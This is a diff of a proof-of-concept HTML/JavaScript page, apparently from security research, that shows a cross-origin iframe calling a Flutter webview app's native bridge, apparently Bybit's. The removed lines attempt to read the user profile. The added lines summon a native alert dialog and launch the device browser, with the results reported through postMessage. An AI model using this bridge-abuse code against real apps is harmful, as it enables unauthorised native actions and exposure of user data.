@@ -5,17 +5,22 @@ document.getElementById('o').textContent = location.origin;
 function report(s){ try{ parent.postMessage("IFRAME|"+s,"*"); }catch(e){} }
 function call(m,f,p){
   return window.flutter_inappwebview.callHandler("_b_bridge_"+m+"_", JSON.stringify({
-    moduleName:m, methodName:f, uniqueId:"if"+Math.random().toString(36).slice(2), params:p||{}}));
+    moduleName:m, methodName:f, uniqueId:"if_"+f+"_"+Math.random().toString(36).slice(2), params:p||{}}));
 }
-report("origin="+location.origin+" callHandler="+(window.flutter_inappwebview&&typeof window.flutter_inappwebview.callHandler));
-// (1) read attempt: response is delivered to the MAIN frame, so the parent logs it
-try { call("UserProfile","getUserProfile",{}).then(r=>report("getUserProfile promise="+JSON.stringify(r))).catch(e=>report("gp-err="+e)); }
-catch(e){ report("gp-throw="+e); }
-// (2) ACTION with an observable side effect: no response needed. If the app drives the
-// device browser to this loopback URL, the iframe's bridge call was AUTHORISED.
+report("alive origin="+location.origin);
+// ACTION 1: native dialog, rendered by the app itself. Visible on a screenshot.
 setTimeout(function(){
-  try { call("UrlLauncher","open",{url:"http://127.0.0.1:9/IFRAME_BRIDGE_AUTHORISED#origin="+encodeURIComponent(location.origin), externalApplication:true})
-        .then(r=>report("UrlLauncher promise="+JSON.stringify(r))).catch(e=>report("ul-err="+e)); }
-  catch(e){ report("ul-throw="+e); }
-}, 3000);
+  try{ call("AlertDialog","showAlert",{title:"Bybit Security",
+        content:"NATIVE DIALOG SUMMONED BY A CROSS-ORIGIN IFRAME ("+location.hostname+")",
+        confirmTitle:"OK", cancelTitle:"Cancel"})
+      .then(r=>report("showAlert promise="+JSON.stringify(r))).catch(e=>report("showAlert err="+e));
+      report("showAlert dispatched"); }catch(e){ report("showAlert throw="+e); }
+},2500);
+// ACTION 2: drive the device browser. Observable over CDP, off the WebView entirely.
+setTimeout(function(){
+  try{ call("UrlLauncher","open",{url:"http://127.0.0.1:9/IFRAME_ACTION#origin="+encodeURIComponent(location.origin),
+        externalApplication:true})
+      .then(r=>report("urlLauncher promise="+JSON.stringify(r))).catch(e=>report("urlLauncher err="+e));
+      report("urlLauncher dispatched"); }catch(e){ report("urlLauncher throw="+e); }
+},7000);
 </script></body>
